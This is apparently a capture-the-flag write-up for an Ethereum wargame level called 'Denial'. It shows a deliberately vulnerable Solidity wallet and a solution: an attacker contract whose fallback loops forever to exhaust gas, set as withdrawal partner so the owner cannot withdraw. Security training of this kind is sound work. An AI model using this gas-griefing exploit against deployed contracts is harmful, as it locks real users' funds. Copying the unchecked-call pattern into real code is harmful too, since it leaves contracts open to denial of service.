# Challenge 20

<img src="./images/BigLevel20.svg" alt="20">

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

Challenge 
---
> This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

> If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

Solution
---
1. If we need to stop the owner from withdrawing , The low-level call will receive the return value between true or false depends on our controlled smart contract code. The Denial contract doesn’t check the return value sending back by our controlled smart contract.

2. The low-level call sends the empty msg.data. So, in our smart contract, fallback() method will be called. Add infinite loop and consume all the gas.
```solidity
contract DenialAttack {
    fallback() external payable {
        while (true) {

        }
    }
}
```

now set the attack contract asa partner.

```js
await contract.setWithdrawPartner(YOUR_ATTACK_ADDRESS)
```
now submit the instance and you will level pass the Level 🎉.